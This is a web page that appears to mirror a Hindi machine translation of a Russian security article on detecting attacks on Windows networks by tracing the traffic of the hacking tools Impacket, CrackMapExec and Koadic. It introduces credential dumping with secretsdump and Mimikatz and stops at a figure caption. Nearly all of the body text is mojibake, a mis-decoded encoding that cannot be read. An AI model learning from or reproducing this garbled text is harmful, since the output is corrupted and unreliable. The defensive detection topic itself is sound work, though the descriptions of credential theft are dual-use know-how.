<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ЁЯСиЁЯП┐тАНЁЯПл ЁЯСиЁЯП┐тАНЁЯдЭтАНЁЯСиЁЯП╝ ЁЯд║ рд╡рд┐рдВрдбреЛрдЬ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдкрд░ рд╣рдорд▓реЛрдВ рдХрд╛ рдкрддрд╛ рдХреИрд╕реЗ рд▓рдЧрд╛рдПрдВ: рд╣реИрдХрд░ рдЯреВрд▓реНрд╕ рдХреА рдЦреЛрдЬ ЁЯСЙ ЁЯТЖЁЯП╝ ЁЯзТЁЯП┐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="рдХреЙрд░реНрдкреЛрд░реЗрдЯ рд╕реЗрдХреНрдЯрд░ рдореЗрдВ рд╣рдорд▓реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рд╣рд░ рд╕рд╛рд▓ рдмрдврд╝ рд░рд╣реА рд╣реИ: рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, 2017 рдореЗрдВ, 2016 рдХреА рддреБрд▓рдирд╛ рдореЗрдВ 13% рдЕрдзрд┐рдХ рдЕрдиреЛрдЦреА рдШрдЯрдирд╛рдПрдВ рджрд░реНрдЬ рдХреА рдЧрдИрдВ рдФрд░ 2018 рдХреЗ рдЕрдВрдд рддрдХ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>рд╡рд┐рдВрдбреЛрдЬ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдкрд░ рд╣рдорд▓реЛрдВ рдХрд╛ рдкрддрд╛ рдХреИрд╕реЗ рд▓рдЧрд╛рдПрдВ: рд╣реИрдХрд░ рдЯреВрд▓реНрд╕ рдХреА рдЦреЛрдЬ</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  рдХреЙрд░реНрдкреЛрд░реЗрдЯ рд╕реЗрдХреНрдЯрд░ рдореЗрдВ рд╣рдорд▓реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рд╣рд░ рд╕рд╛рд▓ рдмрдврд╝ рд░рд╣реА рд╣реИ: рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">2017 рдореЗрдВ,</a> 2016 рдХреА рддреБрд▓рдирд╛ рдореЗрдВ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">13% рдЕрдзрд┐рдХ рдЕрдиреЛрдЦреА рдШрдЯрдирд╛рдПрдВ рджрд░реНрдЬ</a> рдХреА <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЧрдИрдВ</a> рдФрд░ 2018 рдХреЗ рдЕрдВрдд рддрдХ, рдкрд┐рдЫрд▓реА рдЕрд╡рдзрд┐ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">27% рдЕрдзрд┐рдХ рдШрдЯрдирд╛рдПрдВ</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рджрд░реНрдЬ</a> рдХреА <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЧрдИрдВ</a> ред  рдЙрди рд▓реЛрдЧреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рдЬрд╣рд╛рдВ рдореБрдЦреНрдп рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдХрд░рдг рд╡рд┐рдВрдбреЛрдЬ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рд╣реИред  2017-2018 рдореЗрдВ, APT Dragonfly, APT28, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">APT рдордбреНрдбреАрд╡реЙрдЯрд░ рд╕рдореВрд╣реЛрдВ</a> рдиреЗ рдпреВрд░реЛрдк, рдЙрддреНрддрд░реА рдЕрдореЗрд░рд┐рдХрд╛ рдФрд░ рд╕рдКрджреА рдЕрд░рдм рдореЗрдВ рд╕рд░рдХрд╛рд░ рдФрд░ рд╕реИрдиреНрдп рд╕рдВрдЧрдардиреЛрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ред  рдФрд░ рдЙрдиреНрд╣реЛрдВрдиреЗ рдЗрд╕рдХреЗ рд▓рд┐рдП рддреАрди рдЯреВрд▓ рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЗрдореНрдкреИрдХреЗрдЯ</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХреНрд░реИрдХрдкрд╛рдЙрдЬрд╝реЗрд╕рд┐рдХ</a> рдФрд░ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХреЛрдПрдбрд┐рдХ</a> ред  рдЙрдирдХрд╛ рд╕реЛрд░реНрд╕ рдХреЛрдб рдЦреБрд▓рд╛ рдФрд░ GitHub рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред <br><br>  рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкреИрда рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдХреЗ рднреАрддрд░ рдПрдХ рд╣рдорд▓реЗ рдХреЗ рд╡рд┐рдХрд╛рд╕ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдкрд░рд┐рдзрд┐ рдкрд░ рдХрд╛рдмреВ рдкрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╣рдорд▓рд╛рд╡рд░, рд╣рдорд▓реЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдЪрд░рдгреЛрдВ рдореЗрдВ рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред  рдЗрд╕ рддрд░рд╣, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ</a> рдпрд╛ рдФрдЬрд╛рд░реЛрдВ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдореЗрдВ рд╕рдордЭреМрддреЗ рдХреЗ рдирд┐рд╢рд╛рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ</a> рд▓рд┐рдП рдХреЗрд╡рд▓ рддрдХрдиреАрдХ рдХреА рдорджрдж рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдореЗрдВ рдШреБрд╕рдиреЗ рдХреЗ рдмрд╛рдж рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рдХреНрд░рд┐рдп рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛</a> рд╕рдХрддрд╛ рд╣реИред  рдЙрдкрдХрд░рдг рдХрдИ рдХрд╛рд░реНрдп рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ - рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рд╕рд╛рде рдлрд╛рдЗрд▓ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд▓реЗрдХрд░ рд░рд┐рдореЛрдЯ рдорд╢реАрди рдкрд░ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рддрдХред  рд╣рдордиреЗ рдЙрдирдХреА рдиреЗрдЯрд╡рд░реНрдХ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЕрдзреНрдпрдпрди рдХрд┐рдпрд╛ред <a name="habracut"></a><br><br>  рд╣рдореЗрдВ рдХреНрдпрд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ: <br><br><ul><li>  <b>рд╕рдордЭреЗрдВ рдХрд┐ рд╣реИрдХрд┐рдВрдЧ рдЯреВрд▓ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ</b> ред  рдкрддрд╛ рдХрд░реЗрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдХреНрдпрд╛ рдХрд╛рдо рдХрд░рдирд╛ рд╣реИ рдФрд░ рд╡реЗ рдХрд┐рди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред </li><li> <b>рдПрдХ рд╣рдорд▓реЗ рдХреЗ рдкрд╣рд▓реЗ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╕реВрдЪрдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рдХреНрдпрд╛ рдкрддрд╛ рдирд╣реАрдВ рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ</b> ред  рдЦреБрдлрд┐рдпрд╛ рдЪрд░рдг рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рддреЛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЖрдВрддрд░рд┐рдХ рд╣рдорд▓рд╛рд╡рд░ рд╣реИ, рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдореЗрдВ рдПрдХ рдЕрдВрддрд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкрд╣рд▓реЗ рдЬреНрдЮрд╛рдд рдирд╣реАрдВ рдерд╛ред  рдЙрд╕рдХреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдкреВрд░реА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдмрд╣рд╛рд▓ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрд╡рд╕рд░ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдЧреЗ рдХреЗ рдЖрдВрджреЛрд▓рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИред </li><li>  <b>рдШреБрд╕рдкреИрда рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдЭреВрдареЗ рдЕрд▓рд╛рд░реНрдо рдХреЛ рд╣рдЯрд╛ рджреЗрдВ</b> ред  рд╣рдореЗрдВ рдпрд╣ рдирд╣реАрдВ рднреВрд▓рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЕрдХреЗрд▓реЗ рдмреБрджреНрдзрд┐рдорддреНрддрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХреБрдЫ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдкрд░, рдЕрдХреНрд╕рд░ рддреНрд░реБрдЯрд┐рдпрд╛рдВ рд╕рдВрднрд╡ рд╣реИрдВред  рдЖрдорддреМрд░ рдкрд░ рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реИрдз рддрд░реАрдХреЗ рд╕реЗ рдкрд░реНрдпрд╛рдкреНрдд рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ, рдкрд╣рд▓реА рдирдЬрд╝рд░ рдореЗрдВ рдЕрд╡рд┐рд╡реЗрдЪреНрдп рд╣реИрдВред </li></ul><br>  рдпреЗ рдЙрдкрдХрд░рдг рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдХреНрдпрд╛ рджреЗрддреЗ рд╣реИрдВ?  рдпрджрд┐ рдпрд╣ рдЗрдореНрдкреИрдХреЗрдЯ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдореЙрдбреНрдпреВрд▓ рдХреА рдПрдХ рдмрдбрд╝реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдорд┐рд▓рддреА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд░рд┐рдзрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯреВрдЯрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдорд▓реЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдЪрд░рдгреЛрдВ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  рдХрдИ рдЙрдкрдХрд░рдг рдЗрдореНрдкреЗрдХреЗрдЯ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЦреБрдж рдХреЗ рдЕрдВрджрд░ рдХрд░рддреЗ рд╣реИрдВ - рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдореЗрдЯрд╕реНрдкреНрд▓реЛрдЗрдЯред  рдЗрд╕рдореЗрдВ рд░рд┐рдореЛрдЯ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП dcomexec рдФрд░ wmiexec рд╣реИ, рдЬреЛ рдЗрдореНрдкреЗрд╕реЗрдЯ рд╕реЗ рдЬреЛрдбрд╝реЗ рдЧрдП рдореЗрдореЛрд░реА рд╕реЗ рдЦрд╛рддреЛрдВ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдХреНрд░реЗрдЯрдбрдореНрдк рд╣реИред  рдирддреАрдЬрддрди, рдЗрд╕ рддрд░рд╣ рдХреЗ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рд╕рд╣реА рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рднреА рдбреЗрд░рд┐рд╡реЗрдЯрд┐рд╡ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдЧрд╛ред <br><br>  CrackMapExec (рдпрд╛ рд╕рд┐рд░реНрдл CME) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ, рд╕рдВрдпреЛрдЧ рд╕реЗ рд░рдЪрдирд╛рдХрд╛рд░реЛрдВ рдиреЗ "рдЗрдореНрдкреИрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд" рд▓рд┐рдЦрд╛ред  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реАрдПрдордИ рдореЗрдВ рд▓реЛрдХрдкреНрд░рд┐рдп рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╣реИ: рдпрд╣ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдЙрдирдХреЗ рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Mimikatz рд╣реИ, рдФрд░ рд░рд┐рдореЛрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдореАрдЯрд░рдкрд░реЗрдЯрд░ рдпрд╛ рдПрдореНрдкрд╛рдпрд░ рдПрдЬреЗрдВрдЯ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдФрд░ рдмреЛрд░реНрдб рдкрд░ рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рд╣реИред <br><br>  рддреАрд╕рд░рд╛ рдЙрдкрдХрд░рдг рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдЪреБрдирд╛ рд╣реИ рд╡рд╣ рд╣реИ Koadicред  рдпрд╣ рдХрд╛рдлреА рддрд╛рдЬрд╝рд╛ рд╣реИ, 2017 рдореЗрдВ DEFCON 25 рдЕрдВрддрд░рд░рд╛рд╖реНрдЯреНрд░реАрдп рд╣реИрдХрд░ рд╕рдореНрдореЗрд▓рди рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдЗрд╕рдореЗрдВ рдПрдХ рдЧреИрд░-рдорд╛рдирдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИ: HTTP, рдЬрд╛рд╡рд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ Microsoft рд╡рд┐рдЬрд╝реБрдЕрд▓ рдмреЗрд╕рд┐рдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ (VBS) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ред  рдЗрд╕ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЛ рднреВрдорд┐ рд╕реЗ рджреВрд░ рд░рд╣рдирд╛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ: рдЙрдкрдХрд░рдг рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рдирд┐рд░реНрдорд┐рдд рдирд┐рд░реНрднрд░рддрд╛ рдФрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рдПрдХ рд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  рдирд┐рд░реНрдорд╛рддрд╛ рдЗрд╕реЗ COM рдХрдорд╛рдВрдб рдХрдВрдЯреНрд░реЛрд▓ рдпрд╛ C3 рдХрд╣рддреЗ рд╣реИрдВред <br><br><h2>  IMPACKET </h2><br>  Impacket рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдмрд╣реБрдд рд╡рд┐рд╕реНрддреГрдд рд╣реИ, AD рдХреЗ рдЕрдВрджрд░ рдЯреЛрд╣реА рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдФрд░ рдЖрдВрддрд░рд┐рдХ MS SQL рд╕рд░реНрд╡рд░ рд╕реЗ рдбреЗрдЯрд╛ рдПрдХрддреНрд░ рдХрд░рддреА рд╣реИ, рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рддрдХрдиреАрдХреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ: рдпрд╣ рдПрдХ SMB рд░рд┐рд▓реЗ рдЕрдЯреИрдХ рд╣реИ рдФрд░ рдПрдХ ntds.dit рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ рд╕реЗ рдирд╖реНрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред  рдЗрдореНрдкреЗрдХреЗрдЯ рдЪрд╛рд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ: рдбрдмреНрд▓реВрдПрдордЖрдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рд╡рд┐рдВрдбреЛрдЬ рдЕрдиреБрд╕реВрдЪрдХ, рдбреАрд╕реАрдУрдПрдо рдФрд░ рдПрд╕рдПрдордмреА рдХреЗ рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реЗрд╡рд╛, рдФрд░ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред <br><br><h3>  Secretsdump </h3><br>  рдЖрдЗрдП рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рджреЗрдЦреЗрдВред  рдпрд╣ рдПрдХ рдореЙрдбреНрдпреВрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╢реАрдиреЛрдВ рдФрд░ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХреЛрдВ рджреЛрдиреЛрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред  рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк LSA, SAM, SECURITY, NTDS.dit рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреА рдкреНрд░рддрд┐рдпрд╛рдВ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рд╣рдорд▓реЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдЪрд░рдгреЛрдВ рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдореЗрдВ рдкрд╣рд▓рд╛ рдХрджрдо рдПрд╕рдПрдордмреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реИ, рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдкрд╛рд╕ рд╣реИрд╢ рд╣рдорд▓реЗ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдЗрд╕рдХреЗ рд╣реИрд╢ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред  рдЕрдЧрд▓рд╛, рд╕реЗрд╡рд╛ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрдХ (SCM) рддрдХ рдкрд╣реБрдВрдЪ рдЦреЛрд▓рдиреЗ рдФрд░ рд╡рд┐рдирд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз рд╣реИ, рдЬрд┐рд╕рдХреЗ рдЙрдкрдпреЛрдЧ рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрди рд╢рд╛рдЦрд╛рдУрдВ рдХреЗ рдбреЗрдЯрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдПрд╕рдПрдордмреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред <br><br>  рдЕрдВрдЬреАрд░ рдореЗрдВред  1 рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдПрд▓рдПрд╕рдП рдХреЗ рд╕рд╛рде рд░рдЬрд┐рд╕реНрдЯрд░ рдХреБрдВрдЬреА рджреНрд╡рд╛рд░рд╛ рд╡рд┐рдирд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдПрдХреНрд╕реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХреИрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, DCERPC рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ opcode 15 - OpenKey рдХреЗ рд╕рд╛рде рдХрд░реЗрдВред <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i> 